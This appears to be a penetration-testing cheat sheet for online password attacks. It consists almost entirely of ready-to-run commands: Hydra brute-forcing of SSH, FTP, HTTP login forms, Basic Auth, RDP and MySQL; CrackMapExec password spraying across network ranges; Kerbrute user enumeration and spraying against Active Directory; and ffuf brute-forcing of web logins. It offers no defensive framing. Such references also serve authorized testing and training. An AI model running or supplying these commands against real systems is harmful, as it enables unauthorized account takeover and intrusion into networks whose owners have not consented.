# Online Password Attacks

## Hydra

```bash
# SSH
hydra -l user -P rockyou.txt ssh://TARGET -t 4 -f

# FTP
hydra -l admin -P rockyou.txt ftp://TARGET -t 4 -f

# HTTP POST form
hydra -l admin -P rockyou.txt TARGET http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid" -f
# F=Invalid = failure string (what appears on failed login)

# HTTP Basic Auth
hydra -l admin -P rockyou.txt TARGET http-get / -f

# RDP (slow)
hydra -l admin -P top-100.txt rdp://TARGET -t 4 -f

# MySQL
hydra -l root -P rockyou.txt mysql://TARGET -t 4 -f

# Common flags
# -l user         single username
# -L users.txt    username list
# -p pass         single password
# -P list.txt     password list
# -t 4            threads (keep low for SSH)
# -f              stop on first success
# -e nsr          try null, same-as-user, reversed
```

## CrackMapExec (network-wide spray)

```bash
crackmapexec smb RANGE -u user -p 'Password1!' --continue-on-success
crackmapexec smb RANGE -u users.txt -p pass --continue-on-success
crackmapexec winrm RANGE -u user -p pass
crackmapexec ssh RANGE -u user -p pass
crackmapexec mssql TARGET -u sa -p pass
```

## Kerbrute (Active Directory)

```bash
kerbrute userenum -d domain.com --dc DC users.txt                  # find valid users
kerbrute passwordspray -d domain.com users.txt 'Password1!' --dc DC  # spray
```

## ffuf (web login brute force)

```bash
ffuf -u http://TARGET/login -X POST -d "user=admin&pass=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -w rockyou.txt -fs FAIL_SIZE

# Two wordlists (username + password)
ffuf -u http://TARGET/login -X POST -d "user=FUZZU&pass=FUZZP" -H "Content-Type: application/x-www-form-urlencoded" -w users.txt:FUZZU -w passwords.txt:FUZZP -fs FAIL_SIZE
```
